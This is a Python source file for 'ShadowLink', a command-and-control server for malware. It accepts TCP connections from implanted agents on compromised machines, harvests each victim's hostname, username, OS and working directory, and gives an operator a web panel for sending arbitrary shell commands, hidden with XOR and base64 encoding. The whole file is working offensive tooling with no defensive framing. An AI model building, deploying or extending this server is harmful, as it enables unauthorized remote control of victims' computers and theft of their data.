#!/usr/bin/env python3
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import socket
import threading
import time
import base64

# ============================================
# SHADOWLINK C2 FRAMEWORK
# ============================================

app = Flask(__name__)
app.config['SECRET_KEY'] = 'shadowlink-secure-key'
socketio = SocketIO(app, cors_allowed_origins="*")

XOR_KEY = 0x42
agents = {}
command_history = {}

# ============================================
# Terminal Colors (Improved)
# ============================================

RESET = "\033[0m"
BOLD = "\033[1m"

RED = "\033[38;5;196m"
GREEN = "\033[38;5;46m"
YELLOW = "\033[38;5;226m"
BLUE = "\033[38;5;33m"
CYAN = "\033[38;5;51m"
MAGENTA = "\033[38;5;201m"
GRAY = "\033[38;5;240m"

# ============================================
# Config
# ============================================

LPORT = 3455
LPORT_WEB = 22223


# ============================================
# Encryption
# ============================================

def xor_crypt(data):
    return bytes([b ^ XOR_KEY for b in data])


# ============================================
# Agent Class
# ============================================

class Agent:

    def __init__(self, conn, addr):

        self.conn = conn
        self.addr = addr

        self.id = f"{addr[0]}:{addr[1]}"

        self.hostname = "Unknown"
        self.username = "Unknown"
        self.os = "Unknown"
        self.cwd = "Unknown"

        self.status = "Active"
        self.last_seen = time.time()

    def send_command(self, cmd):

        try:

            self.conn.setblocking(False)

            try:
                while self.conn.recv(4096):
                    pass
            except:
                pass

            self.conn.setblocking(True)
            self.conn.settimeout(15.0)

            encrypted_bytes = xor_crypt(cmd.encode())
            b64_cmd = base64.b64encode(encrypted_bytes)

            self.conn.send(b64_cmd + b'\n')

            response = b''
            start_time = time.time()

            while True:

                try:

                    chunk = self.conn.recv(16384)

                    if not chunk:
                        break

                    response += chunk

                    if b'\n' in chunk:
                        break

                except socket.timeout:
                    break

                except BlockingIOError:

                    time.sleep(0.1)
                    continue

                if time.time() - start_time > 20:
                    break

            if not response:
                return "No response from agent"

            try:

                parts = response.strip().split(b'\n')
                result_raw = parts[-1]

                decoded_b64 = base64.b64decode(result_raw)
                decrypted = xor_crypt(decoded_b64)

                try:
                    final_output = decrypted.decode('cp866')
                except:
                    final_output = decrypted.decode('utf-8', errors='replace')

            except:

                final_output = response.decode('utf-8', errors='replace')

            self.last_seen = time.time()

            return final_output

        except Exception as e:

            self.status = "Disconnected"
            return f"Connection lost: {str(e)}"

    def parse_sysinfo(self, data):

        try:

            decoded = base64.b64decode(data).decode('utf-8', errors='ignore')
            parts = decoded.split('|')

            if len(parts) >= 5:

                self.hostname = parts[1]
                self.username = parts[2]
                self.os = parts[3]
                self.cwd = parts[4]

        except:
            pass


# ============================================
# Agent Connection Handler
# ============================================

def handle_agent(conn, addr):

    agent = Agent(conn, addr)

    try:

        data = conn.recv(4096)

        if data:

            if data.endswith(b'\n'):
                data = data[:-1]

            agent.parse_sysinfo(data)

            agents[agent.id] = agent
            command_history[agent.id] = []

            print(f"{GREEN}[CONNECTED]{RESET} {addr[0]}  {GRAY}({agent.hostname}){RESET}")

            broadcast_agents()

        while agent.status == "Active":

            time.sleep(1)

    except Exception as e:

        print(f"{RED}[ERROR]{RESET} {e}")

    finally:

        if agent.id in agents:

            agents[agent.id].status = "Disconnected"
            broadcast_agents()


# ============================================
# Listener
# ============================================

def start_listener():

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    server.bind(('0.0.0.0', LPORT))
    server.listen(5)

    print(f"{CYAN}[LISTENING]{RESET} 0.0.0.0:{LPORT}")

    while True:

        conn, addr = server.accept()

        print(f"{BLUE}[NEW AGENT]{RESET} {addr[0]}:{addr[1]}")

        thread = threading.Thread(
            target=handle_agent,
            args=(conn, addr)
        )

        thread.daemon = True
        thread.start()


# ============================================
# Web Interface
# ============================================

def broadcast_agents():

    agent_list = []

    for agent_id, agent in agents.items():

        agent_list.append({

            'id': agent.id,
            'hostname': agent.hostname,
            'username': agent.username,
            'os': agent.os,
            'cwd': agent.cwd,
            'status': agent.status,
            'last_seen': int(time.time() - agent.last_seen)

        })

    socketio.emit('agent_list', agent_list)


@app.route('/')
def index():

    return render_template('index.html')


@socketio.on('connect')
def handle_connect():

    broadcast_agents()


@socketio.on('execute_command')
def handle_command(data):

    agent_id = data['agent_id']
    command = data['command']
    callback_id = data.get('callback_id', '')

    if agent_id not in agents:

        emit('command_result', {

            'error': 'Agent not found',
            'callback_id': callback_id

        })

        return

    agent = agents[agent_id]

    result = agent.send_command(command)

    if command.strip().startswith('cd ') or command.strip() == 'cd':

        lines = result.strip().split('\n')

        if lines:

            pathCandidate = lines[0].strip()

            if (
                (len(pathCandidate) > 2 and pathCandidate[1:3] == ':\\')
                or pathCandidate.startswith('/')
                or pathCandidate.startswith('\\\\')
            ):

                agent.cwd = pathCandidate
                broadcast_agents()

    command_history[agent_id].append({

        'command': command,
        'result': result,
        'timestamp': time.time()

    })

    emit('command_result', {

        'agent_id': agent_id,
        'command': command,
        'result': result,
        'callback_id': callback_id

    })


# ============================================
# MAIN ENTRY
# ============================================

if __name__ == "__main__":

    print(f"""{MAGENTA}

   ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗██╗     ██╗███╗   ██╗██╗  ██╗
   ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║██║     ██║████╗  ██║██║ ██╔╝
   ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║██║     ██║██╔██╗ ██║█████╔╝ 
   ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║██║     ██║██║╚██╗██║██╔═██╗ 
   ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝███████╗██║██║ ╚████║██║  ██╗
   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝

{RESET}""")

    print(f"{GREEN}[SYSTEM]{RESET} ShadowLink C2 Server Online")
    print(f"{CYAN}[WEB]{RESET} http://0.0.0.0:{LPORT_WEB}")

    listener_thread = threading.Thread(target=start_listener)

    listener_thread.daemon = True
    listener_thread.start()

    socketio.run(
        app,
        host="0.0.0.0",
        port=LPORT_WEB,
        debug=False,
        allow_unsafe_werkzeug=True
    )
